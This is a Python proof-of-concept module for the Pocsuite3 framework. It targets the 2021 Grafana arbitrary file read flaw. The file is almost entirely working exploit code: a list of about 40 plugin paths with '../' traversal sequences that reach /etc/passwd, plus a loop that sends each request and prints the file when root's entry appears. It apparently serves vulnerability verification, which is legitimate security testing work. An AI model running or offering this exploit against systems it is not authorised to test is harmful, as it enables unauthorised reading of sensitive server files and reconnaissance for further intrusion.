# coding:utf-8
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc
import urllib.request


class xxxx(POCBase):
    vulID = 'xxxx'
    version = '1.0'
    references = ['']
    name = '2021_grafana_arbitrary_file_read'
    vulType = 'arbitrary_file_read'
    appName = 'Grafana'
    risk = 'High'
    appVersion = ''
    samples = []
    category = POC_CATEGORY.EXPLOITS.REMOTE
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    desc = 'grafana_arbitrary_file_read'

    def _check(self):
        headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
        result = []
        plugin_list = [
            '/public/plugins/alertlist/../../../../../../../../etc/passwd',
            '/public/plugins/annolist/../../../../../../../../etc/passwd',
            '/public/plugins/barchart/../../../../../../../../etc/passwd',
            '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
            '/public/plugins/dashlist/../../../../../../../../etc/passwd',
            '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
            '/public/plugins/graph/../../../../../../../../etc/passwd',
            '/public/plugins/graphite/../../../../../../../../etc/passwd',
            '/public/plugins/heatmap/../../../../../../../../etc/passwd',
            '/public/plugins/influxdb/../../../../../../../../etc/passwd',
            '/public/plugins/mysql/../../../../../../../../etc/passwd',
            '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
            '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
            '/public/plugins/postgres/../../../../../../../../etc/passwd',
            '/public/plugins/prometheus/../../../../../../../../etc/passwd',
            '/public/plugins/stackdriver/../../../../../../../../etc/passwd',
            '/public/plugins/table/../../../../../../../../etc/passwd',
            '/public/plugins/text/../../../../../../../../etc/passwd',
            '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
            '/public/plugins/bargauge/../../../../../../../../etc/passwd',
            '/public/plugins/gauge/../../../../../../../../etc/passwd',
            '/public/plugins/geomap/../../../../../../../../etc/passwd',
            '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
            '/public/plugins/histogram/../../../../../../../../etc/passwd',
            '/public/plugins/jaeger/../../../../../../../../etc/passwd',
            '/public/plugins/logs/../../../../../../../../etc/passwd',
            '/public/plugins/loki/../../../../../../../../etc/passwd',
            '/public/plugins/mssql/../../../../../../../../etc/passwd',
            '/public/plugins/news/../../../../../../../../etc/passwd',
            '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
            '/public/plugins/piechart/../../../../../../../../etc/passwd',
            '/public/plugins/stat/../../../../../../../../etc/passwd',
            '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
            '/public/plugins/status-history/../../../../../../../../etc/passwd',
            '/public/plugins/table-old/../../../../../../../../etc/passwd',
            '/public/plugins/tempo/../../../../../../../../etc/passwd',
            '/public/plugins/testdata/../../../../../../../../etc/passwd',
            '/public/plugins/timeseries/../../../../../../../../etc/passwd',
            '/public/plugins/welcome/../../../../../../../../etc/passwd',
            '/public/plugins/zipkin/../../../../../../../../etc/passwd',
        ]

        try:
            for plugin_path in plugin_list:
                url = self.url = self.url.rstrip("/") + plugin_path
                re = urllib.request.Request(url=url, headers=headers)
                res = urllib.request.urlopen(re, timeout=3)
                code = res.getcode()
                context = res.read()
                if code == 200 and context:
                    if 'root:x:0:0:' in context.decode('utf-8'):
                        print(context.decode('utf-8')[:200])
                        result.append(url)
                        break
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        result = {}
        p = self._check()
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = p
            result['VerifyInfo']['risk'] = self.risk
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


register_poc(xxxx)
